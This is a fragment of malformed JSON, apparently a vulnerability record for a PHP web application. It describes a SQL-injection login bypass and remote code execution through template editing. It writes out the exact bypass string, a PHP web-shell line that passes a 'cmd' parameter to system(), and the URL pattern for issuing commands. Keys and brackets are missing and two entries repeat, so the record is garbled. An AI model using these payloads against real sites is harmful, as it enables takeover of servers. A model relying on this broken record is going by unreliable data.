      "details": {
        "root_cause": "Improper input validation and lack of sanitization in the login process, and template editing functionality.",

          "SQL Injection (CWE-89)",
          "Remote Code Execution"

          "HTTP requests to the login page using a specially crafted login string",
          "Editing the template with a malicious payload through the application web interface"
        ],
        "attacker_capabilities": "The attacker needs to send HTTP requests to the vulnerable application. Once logged in, the attacker needs the ability to edit templates.",
          "additional_info": "The SQL injection vulnerability is triggered through a crafted login string: `\" or isnull(1/0) /*`, effectively bypassing the login authentication. The attacker can then inject PHP code into a template via the web interface, which can be executed by sending a HTTP request with a `cmd` parameter, resulting in remote code execution."

         "attacker_capabilities":"The attacker needs to send HTTP requests to the application. Additionally, they need to be able to edit templates after logging in to achieve remote code execution.",
         "additional_info": "The login bypass is achieved using the string `\" or isnull(1/0) /*` as the username. Remote code execution is achieved by inserting `<?php error_reporting(0); system($HTTP_GET_VARS[cmd]); ?>` into a template, allowing execution of system commands via `http://[target]/[path_to_dscribe]/index.php?cmd=[some_command]`."
